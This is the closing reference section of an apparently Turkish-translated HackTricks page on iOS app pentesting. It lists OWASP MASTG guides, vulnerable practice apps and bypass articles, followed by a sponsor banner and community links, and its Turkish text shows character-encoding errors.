* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS ve Mobil Uygulama Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS Ã¼cretsiz kurs([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C sÃ¼rÃ¼mÃ¼ [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift sÃ¼rÃ¼mÃ¼
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
